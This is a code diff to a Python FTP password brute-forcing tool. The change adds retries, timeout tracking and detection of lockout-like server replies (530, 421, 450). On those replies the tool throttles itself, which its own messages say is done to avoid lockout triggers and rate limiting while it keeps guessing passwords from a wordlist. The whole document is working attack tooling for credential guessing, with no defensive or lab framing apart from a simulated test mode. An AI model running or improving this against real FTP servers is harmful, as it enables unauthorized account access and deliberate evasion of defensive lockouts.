@@ -7,25 +7,51 @@ import ftplib
 import time
 import sys
 import argparse
+import socket
 
 console = Console()
 TEST_MODE = False
 
-def try_ftp_login(ip, username, password):
+def try_ftp_login(ip, username, password, delay=0.5, max_retries=2, timeout_tracker=None, lockout_tracker=None):
     password = password.strip()
     console.print(f"[cyan][DEBUG][/cyan] Trying FTP login with: {username}:{password}")
-    try:
-        with ftplib.FTP(ip, timeout=5) as ftp:
-            ftp.login(user=username, passwd=password)
-            console.print(f"[bold green][SUCCESS][/bold green] Logged in with [cyan]{username}:{password}[/cyan]")
-            return True
-    except ftplib.error_perm as e:
-        console.print(f"[red][FAILED][/red] {username}:{password} - {e}")
-        return False
-    except Exception as e:
-        console.print(f"[bold red][FAILURE][/bold red] Could not connect to FTP server at {ip}")
-        console.print(f"Reason: {e}")
-        return False
+
+    for attempt in range(max_retries):
+        try:
+            with ftplib.FTP(ip, timeout=10) as ftp:
+                ftp.login(user=username, passwd=password)
+                console.print(f"[bold green][SUCCESS][/bold green] Logged in with [cyan]{username}:{password}[/cyan]")
+                if timeout_tracker:
+                    timeout_tracker['consecutive_timeouts'] = 0
+                if lockout_tracker:
+                    lockout_tracker['lockout_hits'] = 0
+                return True
+        except ftplib.error_perm as e:
+            msg = str(e)
+            console.print(f"[red][FAILED][/red] {username}:{password} - {msg}")
+            if any(code in msg for code in ["530", "421", "450"]):
+                if lockout_tracker:
+                    lockout_tracker['lockout_hits'] += 1
+            break
+        except ftplib.error_temp as e:
+            msg = str(e)
+            console.print(f"[yellow][TEMP ERROR][/yellow] {username}:{password} - {msg}")
+            if any(code in msg for code in ["421", "450"]):
+                if lockout_tracker:
+                    lockout_tracker['lockout_hits'] += 1
+            time.sleep(1)
+        except socket.timeout:
+            console.print(f"[bold red][TIMEOUT][/bold red] Connection to {ip} timed out on attempt {attempt+1}")
+            if timeout_tracker:
+                timeout_tracker['consecutive_timeouts'] += 1
+            time.sleep(1)
+        except Exception as e:
+            console.print(f"[bold red][FAILURE][/bold red] Could not connect to FTP server at {ip}")
+            console.print(f"Reason: {e}")
+            break
+
+    time.sleep(delay)
+    return False
 
 def brute_force_ftp(ip, username, wordlist_path):
     try:
@@ -37,6 +63,8 @@ def brute_force_ftp(ip, username, wordlist_path):
 
     spinner = Spinner("dots", text="Trying passwords...")
     found_password = None
+    timeout_tracker = {'consecutive_timeouts': 0}
+    lockout_tracker = {'lockout_hits': 0}
     live = Live(spinner, refresh_per_second=12, transient=True)
     live.start()
 
@@ -50,6 +78,16 @@ def brute_force_ftp(ip, username, wordlist_path):
     )
 
     for i, password in enumerate(progress):
+        if timeout_tracker['consecutive_timeouts'] >= 3:
+            console.print(f"[yellow][WARNING][/yellow] 3+ timeouts in a row. Relay may be rate limiting. Slowing down...")
+            time.sleep(2)
+            timeout_tracker['consecutive_timeouts'] = 0
+
+        if lockout_tracker['lockout_hits'] >= 3:
+            console.print(f"[yellow][WARNING][/yellow] Multiple lockout-like responses (530, 421). Slowing down to avoid trigger...")
+            time.sleep(3)
+            lockout_tracker['lockout_hits'] = 0
+
         table = Table(title="Brute-Force Status")
         table.add_column("Status", justify="left")
         table.add_row(f"[bold blue]Attempt {i+1} of {len(passwords)}[/bold blue]")
@@ -58,14 +96,12 @@ def brute_force_ftp(ip, username, wordlist_path):
         group = Group(spinner, table)
         live.update(group)
 
-        time.sleep(0.1)
-
         if TEST_MODE and password == "naruto":
             console.print(f"\n[bold green][SIMULATED SUCCESS][/bold green] Login with [cyan]{username}:{password}[/cyan]")
             found_password = password
             break
 
-        if try_ftp_login(ip, username, password):
+        if try_ftp_login(ip, username, password, delay=0.5, timeout_tracker=timeout_tracker, lockout_tracker=lockout_tracker):
             found_password = password
             break
 
